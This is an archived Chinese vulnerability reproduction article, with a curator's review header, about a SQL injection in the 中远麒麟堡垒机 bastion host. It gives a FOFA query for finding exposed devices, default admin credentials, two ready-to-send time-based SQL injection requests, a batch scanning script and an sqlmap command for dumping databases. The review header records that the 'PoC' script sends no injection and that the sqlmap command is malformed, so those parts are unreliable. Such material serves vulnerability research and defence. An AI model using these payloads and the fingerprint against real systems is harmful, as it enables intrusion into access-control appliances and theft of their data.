---
source: "MrWQ/vulnerability-paper"
id: "vw-4d679045887b016be9dd112d"
entity_id: "ve-4d679045887b016be9dd112d"
schema_version: "1"
title: "中远麒麟堡垒机 SQL 注入漏洞复现 and 漏洞利用（附 poc 和 EXP）"
product: "中远麒麟堡垒机"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未固定tar包版本，正文无Cookie请求；MySQL延时"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20and%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E9%99%84%20poc%20%E5%92%8C%20EXP%EF%BC%89.md"
review_date: "2026-10-02"
side_effects: "延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入"
source_url: "https://mp.weixin.qq.com/s/wLwCqGByeLqxq98wy4IuXA"
source_status: "recorded"
previous_fofa_unverified: "搜索语句"
fofa: "body=\"url=\\\"admin.php?controller=admin_index&action=get_user_login_fristauth&username=\""
---

# 中远麒麟堡垒机 SQL 注入漏洞复现 and 漏洞利用（附 poc 和 EXP）

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：中远麒麟堡垒机
- 本文讨论：admin_commonuser username SQL注入
- 版本、权限与配置前提：未固定tar包版本，正文无Cookie请求；MySQL延时
- 资料类型：本地搭建/SQL注入复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 所谓批量PoC只是GET匹配登录错误，没有发送注入或检测延时，不能据此判漏洞
- sqlmap命令data引号未闭合且参数名截断，无法直接运行
- 搭建版本不可重复定位；缺正式补丁；FOFA字段占位
- 手动5/15秒与基线有互补证据，应保留而非因脚本错全删
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入

### 待核与来源

- 原始安装版本、截图时序和厂商修复待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wLwCqGByeLqxq98wy4IuXA)

申明：**本文仅供技术学习参考使用，请勿用作违法用途，否则后果自负。**

一、漏洞名称

中远麒麟堡垒机 SQL 注入漏洞

二、漏洞影响

中远麒麟堡垒机

系统登陆界面大概有这几种

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbD6kn36Mmd9uqia7Abpc94zPlLgSPd42r95EtjgnY8HOHmmLAJ1dlUawQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDfQUdHtkYKJvO0qrLl0sfKpIDpibX96FNFIicE8OTfh2QJ74AsR3Rkg2A/640?wx_fmt=png)

三、漏洞描述

中远麒麟堡垒机能够提供细粒度的访问控制，最大限度保护用户资源的安全。但麒麟堡垒机存在 SQL 注入漏洞。

四、资产 FOFA 搜索语句

```
body="url=\"admin.php?controller=admin_index&action=get_user_login_fristauth&username="

```

五、靶场搭建

下载，先从官网下载一个堡垒机安装包：http://www.tosec.com.cn/download.htm  

官方安装文档：https://doc.tosec.com.cn/install/tar_install/

官方有两种安装方式：tar 包安装和虚拟机安装，我是用 tar 包安装的  

解压

```
tar -zxvf centos7.tar.gz

```

运行两个脚本，安装软件

```
bash yum.sh
bash install.sh

```

安装完成后重启系统

```
reboot

```

查看

```
netstat -atunlp |grep 2288

```

浏览器访问：https://192.168.190.132

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDFOv3Q1VIa82laF1Lmagt5SC1MguBQW3ZG7qkqXp4DhlKW3JLRw4GXg/640?wx_fmt=png)

注意：浏览器访问时会提示不安全，点击左下方的 “高级” 继续访问。

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDfQUdHtkYKJvO0qrLl0sfKpIDpibX96FNFIicE8OTfh2QJ74AsR3Rkg2A/640?wx_fmt=png)

默认用户名：admin

默认密码：12345678

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDnUzX7nFo4icGozsic2Zo78ksxdXdp22lRmHjzdeiabAGNkCTbX3icjo8gQ/640?wx_fmt=png)

ssh 连接，端口 2288，root 密码还是你系统的密码。

六、漏洞复现  

向目标发送如下请求数据包，使响应延迟 5 秒  

```http
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 78
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDT1libag1yHxbJiaJymAj7u1pTibyvVz8TZiae3moJ6VDic3P7qIEPV6TWqA/640?wx_fmt=png)

向目标发送如下请求数据包，使响应延迟 15 秒

```http
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 79
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(15)))ptGN) AND 'AAdm'='AAdm

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDVrr7Zia8zJfJ2ZvWHIs7Fv0dtro8TP53sicNiawTJNUHSHZKqWCicFuw4Q/640?wx_fmt=png)

正常系统是在毫秒级响应，加上 SLEEP(5) 和 SLEEP(15) 之后响应时间分别为 5.064 秒和 15.134 秒证明存在 **sql 注入漏洞**

七、漏洞验证 poc

该 python 脚本可以批量检测漏洞，C:\Users\DELL\Desktop\1.txt 为输入目标文件，每行是一个 url

```
import argparse
import time
import requests
def get_url(file):
    with open('{}'.format(file),'r',encoding='utf-8') as f:
        for i in f:
            i = i.replace('\n', '')
            send_req(i)
def write_result(content):
    f = open("result.txt", "a", encoding="UTF-8")
    f.write('{}\n'.format(content))
    f.close()
def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/admin.php?controller=admin_commonuser'
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url,headers=header,verify=False,timeout=3)
        if response.status_code == 200 and "result" in response.text and "username and password does not match!" in response.text:
            result = '{} 存在中远麒麟堡垒机SQL注入漏洞!\n'.format(url_check)
            print(result)
            write_result(result)
        time.sleep(1)
    except Exception as e:
        pass
if __name__ == '__main__':
    file = r"C:\Users\DELL\Desktop\1.txt"
    get_url(file)

```

在桌面新建文件 1.txt, 写入靶场地址，使用 jupyter 运行上述代码

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDMnDSzicMSUshsYl4cDIH0ib3CGIC2mgAfI49Qnn5lBr41TFSmG3Slt7w/640?wx_fmt=png)

八、漏洞利用

使用 Sqlmap 获取数据库名称，中间提示一路输入 Y 并回车即可

```
sqlmap -u "https://ip:port/admin.php?controller=admin_commonuser" --data "user --level=3 --dbs

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDFnnamfyyA6Xm5RburJn2ibjvFY6qZY0x91DNDSkIW5OvrWexWCULyxQ/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
